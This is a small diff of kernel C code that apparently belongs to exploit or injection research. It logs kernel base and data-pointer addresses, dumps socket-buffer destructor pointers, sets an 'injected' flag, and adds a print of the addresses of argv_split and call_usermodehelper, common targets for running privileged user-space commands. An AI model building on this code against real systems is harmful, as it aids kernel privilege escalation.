@@ -971,7 +971,8 @@ static inline void modify_shinfo(void *va, unsigned int frag_size)
 		pr_crit_once("512 gilkup_vars.page_offset=%p max_ptr=%p kernel_base=%p PFN=%p\n",
 			(void*)gilkup_vars.page_offset, (void*)gilkup_vars.max_data_pointer, (void*)gilkup_vars.kernel_base, (void*)PFN);
 		pr_crit_once("data %p destructor %p\n", va, shinfo->destructor_arg);
-		for (i = 0; i < 100; ++i)
+		pr_crit_once("argv_split=%p call_usermodehelper=%p\n", &argv_split, &call_usermodehelper);
+		for (i = 0; i < 20; ++i)
 			pr_crit("destructor[%d]=%p\n", i , ((void**)shinfo->destructor_arg)[i]);
 
 		gilkup_vars.injected = true;
